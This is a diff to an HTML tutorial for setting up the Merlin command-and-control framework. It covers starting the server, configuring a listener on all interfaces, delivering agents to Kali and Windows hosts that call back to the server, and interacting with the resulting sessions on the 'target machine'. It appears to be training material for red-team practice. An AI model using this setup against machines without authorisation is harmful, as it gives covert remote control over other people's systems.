@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Shehnaz Khan">
     <title>Merlin C2 Setup Guide</title>
     <style>
         body {
@@ -53,6 +54,13 @@
             margin: 20px 0;
             color: #000;
         }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 20px 0;
+            border: 2px solid #18d26e;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
@@ -66,74 +74,96 @@
 
         <h3>1. Download the Latest Version of Merlin</h3>
         <p>Go to the <a href="https://github.com/Ne0nd0g/merlin/releases" target="_blank">Merlin GitHub Releases Page</a> to download the latest version of the framework.</p>
-        <p>Use the following <code>wget</code> command to download the server file:</p>
-        <pre><code>wget https://github.com/Ne0nd0g/merlin/releases/download/v2.1.3/merlinServer-Darwin-x64.7z</code></pre>
+        <p>Download the latest version -> Use the following <code>wget</code> command to download the server file:</p>
+        <p>Example:</p>
+        <pre><code>wget https://github.com/Ne0nd0g/merlin/releases/download/v2.1.3/merlinServer-Linux-x64.7z</code></pre>
+        <img src="/assets/img/merlin/1.png" alt="Downloading Merlin C2">
 
         <h3>2. Extract the Compressed File</h3>
         <p>After the file has been downloaded, extract it using the <code>7z</code> tool.</p>
         <p>Use the following command to extract the file:</p>
         <pre><code>7z x merlinServer-Linux-x64-v2.1.3.7z</code></pre>
         <p><strong>Note:</strong> The extracted files are password-protected. The password for extraction is <strong>merlin</strong>.</p>
+        <img src="/assets/img/merlin/2.png" alt="Extracting Merlin C2">
 
         <h2>Step 2: Running the Merlin Server</h2>
 
         <h3>1. Start the Merlin Server</h3>
         <p>Navigate to the folder where the server has been extracted and run the Merlin server with the following command:</p>
-        <pre><code>./<name_of_server_file></code></pre>
+        <pre><code>./merlinservername<name_of_server_file></code></pre>
         <p>Example:</p>
         <pre><code>./merlinServer</code></pre>
+        <img src="/assets/img/merlin/3.png" alt="Starting Merlin Server">
 
         <h3>2. Verify Server is Running</h3>
-        <p>Once the server is running, navigate to the directory <code>/data/bin</code> to access the compiled Merlin CLI and agent files:</p>
+        <p>Once the server is running, open new terminal at same location and navigate to the directory <code>/data/bin</code> to access the compiled Merlin CLI and agent files:</p>
         <pre><code>cd /data/bin</code></pre>
+        <!-- <img src="example4.png" alt="Verifying Merlin Server"> -->
 
         <h3>3. Start the Merlin CLI</h3>
         <p>Run the Merlin CLI in the <code>/data/bin</code> directory with the following command:</p>
         <pre><code>./merlinCLI</code></pre>
+        <img src="/assets/img/merlin/4.png" alt="Starting Merlin CLI">
 
         <h3>4. Start the Listeners</h3>
         <p>With the CLI running, initiate the listeners using the command:</p>
         <pre><code>listeners</code></pre>
+        <img src="/assets/img/merlin/5.png" alt="Starting Listeners">
 
         <h3>5. Configure Merlin to Listen on All IPs</h3>
         <p>If you wish to run Merlin on a global IP address (allowing access from any device in the network), follow these steps:</p>
         <ul>
+            <li>Use protocol HTTP, HTTPS, etc <code>use HTTPS</code> (to choose HTTPS protocol):</li>
             <li>Set the interface to <code>0.0.0.0</code> (to listen on all interfaces):</li>
             <pre><code>set Interface 0.0.0.0</code></pre>
             <li>Set the port to <code>8443</code> (or any other port of your choice):</li>
-            <pre><code>set port 8443</code></pre>
-            <li>Start the listener:</li>
-            <pre><code>start</code></pre>
+            <pre><code>set Port 8443</code></pre>
             <li>Use the <code>show</code> command to verify the listener’s status:</li>
             <pre><code>show</code></pre>
+            <li>Start the listener:</li>
+            <pre><code>start</code></pre>
+            
         </ul>
+        <img src="/assets/img/merlin/6.png" alt="Configuring Listener">
 
         <h2>Step 3: Running the Merlin Agent</h2>
 
         <h3>1. On Kali Linux</h3>
         <p>Open a new terminal window and run the Merlin agent with the default URL pointing to the server:</p>
         <pre><code>./merlinAgent -url http://127.0.0.1:443</code></pre>
-
+        <P>As listener is configure on global ip you can use your host ip also insted of local host,</P>
+        <img src="/assets/img/merlin/7.png" alt="Running Merlin Agent on Kali Linux">
+        <p>Once the agent is running you can see the session is created and listner is started listning the agent.</p>
+        <img src="/assets/img/merlin/8.png" alt="Listener listning the merlin agent">
+        
         <h3>2. On Windows</h3>
         <p>Send the Windows agent to the Windows machine.</p>
         <p>Use a Python server to share the Windows agent:</p>
         <pre><code>python3 -m http.server {port}</code></pre>
+        <img src="/assets/img/merlin/9.png">
         <p>Access the server from the Windows browser and download the Windows Merlin agent.</p>
+        <img src="/assets/img/merlin/10.png">
         <p>Go to the folder where the agent is downloaded, open the Command Prompt (CMD) in that directory, and run the Merlin agent:</p>
-        <pre><code>.<\windowsmerlinagentname> -url https://<ip_of_machine_where_server_is_running>:<port></code></pre>
+        <pre><code>.\windowsmerlinagentname -url https://ip_of_machine_where_server_is_running:port_no </code></pre>
+        <img src="/assets/img/merlin/11.png" alt="Running Merlin Agent on Windows">
 
         <h3>3. Listing the Agents</h3>
         <p>To view all running agents, use the <code>sessions</code> command:</p>
         <pre><code>sessions</code></pre>
+        <img src="/assets/img/merlin/12.png" alt="Listing Agents">
 
         <h2>Step 4: Interacting with the Agents</h2>
 
         <h3>1. Interacting with an Agent</h3>
         <p>To interact with a specific agent, use the <code>interact</code> command followed by the agent's ID (listed in the <code>sessions</code> output):</p>
-        <pre><code>interact <agent_id></code></pre>
+        <pre><code>interact agent_id </code></pre>
+        <img src="/assets/img/merlin/13.png" alt="Interacting with an Agent">
 
         <h3>2. Available Commands</h3>
         <p>After successfully interacting with the agent, type <code>help</code> to see a list of available commands that you can execute on the agent machine.</p>
+        <img src="/assets/img/merlin/14.png" alt="Available Commands">
+        <p>Now you have successfully gain the acces of the target machine where the agent is runnign</p>
+        <img src="/assets/img/merlin/15.png" alt="Access of target machine">
 
         <p>This guide provides a clear and structured approach for anyone to follow and set up the Merlin C2 framework. Ensure that you follow each step carefully and verify your setup at each stage to avoid any issues.</p>
     </div>
